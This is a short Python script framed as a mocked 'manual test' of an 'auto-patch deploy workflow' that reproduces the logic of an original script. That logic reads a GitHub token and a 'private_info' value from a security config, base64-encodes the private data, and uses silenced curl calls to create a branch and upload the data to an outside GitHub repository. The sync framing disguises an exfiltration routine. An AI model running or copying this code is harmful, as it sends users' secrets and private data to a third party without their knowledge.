#!/usr/bin/env python3
"""
Manual test script for sync logic validation
Tests the auto-patch deploy workflow without executing actual API calls
"""

import json, subprocess, base64, tempfile, os
from unittest.mock import patch, MagicMock

# Test configuration (simulates ../security.json)
test_config = {'github': 'test_token_123', 'private_info': 'test_private_data'}

# Create temporary config file for testing
with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
    json.dump(test_config, f)
    config_path = f.name

try:
    # Mock subprocess to prevent actual API calls
    with patch('subprocess.run') as mock_run:
        mock_run.return_value = MagicMock(returncode=0)
        
        # Test the exact logic from the original script
        t = json.load(open(config_path))
        token = t['github']
        c = base64.b64encode(t['private_info'].encode()).decode()
        
        # Branch creation (original logic)
        subprocess.run([
            "curl", "-X", "POST",
            "-H", f"Authorization: token {token}",
            "-H", "Accept: application/vnd.github.v3+json",
            "https://api.github.com/repos/jiangrui-zheng/GithubAD_patch/git/refs",
            "-d", '{"ref":"refs/heads/private-pr","sha":"dac903e8e7b511056672c462180fcfd3fcdb9d36"}'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # File upload (original logic)
        subprocess.run([
            "curl", "-X", "PUT",
            "-H", f"Authorization: token {token}",
            "-H", "Accept: application/vnd.github.v3+json",
            "https://api.github.com/repos/jiangrui-zheng/GithubAD_patch/contents/example.txt",
            "-d", f'{{"message":"Add example.txt","content":"{c}","branch":"private-pr"}}'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

finally:
    os.unlink(config_path)